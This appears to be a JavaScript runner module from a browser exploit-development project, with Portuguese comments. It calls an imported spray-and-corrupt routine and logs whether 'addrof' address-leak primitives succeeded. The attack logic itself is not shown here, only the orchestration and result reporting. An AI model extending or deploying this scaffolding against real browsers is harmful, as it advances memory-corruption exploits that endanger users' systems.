// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_SprayAndCorruptPrimitiveArray,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() { // Nome da função runner pode ser mais genérico agora
    const FNAME_RUNNER = "runHeisenbugReproStrategy_SprayAndCorruptPrimitiveArray"; // Atualizado
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_SprayAndCorruptPrimitiveArray(); // Atualizado

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) { 
        logS3(`   RUNNER: Teste principal capturou ERRO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: MainTest ERR!`; 
    } else {
        logS3(`   RUNNER: Teste Completou. Stringify Output Final (Parseado Array): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "good", FNAME_RUNNER);
        // result.toJSON_details agora é um array de todos os detalhes de chamadas da sonda
        if (result.toJSON_details && Array.isArray(result.toJSON_details)) {
            logS3(`   RUNNER: Detalhes de todas as ${result.toJSON_details.length} chamadas da sonda: ${JSON.stringify(result.toJSON_details)}`, "dev_verbose");
        } else {
            logS3(`   RUNNER: Detalhes das chamadas da sonda não capturados ou não é array.`, "warn");
        }

        let anyAddrofSuccess = false;
        if (result.addrof_A_result && result.addrof_A_result.success) {
             logS3(`     ADDROF A (from Array) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_A_result) {
             logS3(`     ADDROF A (from Array) FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result && result.addrof_B_result.success) {
             logS3(`     ADDROF B (from Array) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_B_result) {
             logS3(`     ADDROF B (from Array) FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
        }
        
        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: AddrInArray SUCCESS!`;
        } else {
            // Verificar se a sonda foi chamada para os objetos de leak
            let objectLeakAttempted = false;
            if (result.toJSON_details && Array.isArray(result.toJSON_details)) {
                objectLeakAttempted = result.toJSON_details.some(d => d.this_is_victim_array_el && d.this_type === '[object Object]');
            }
            if(objectLeakAttempted) {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: ObjInArray Processed, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: Test OK, No Clear TC/Addr`;
            }
        }
    }

    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Heisenbug (${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Processed")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA} Test Done`;
        }
    }
}
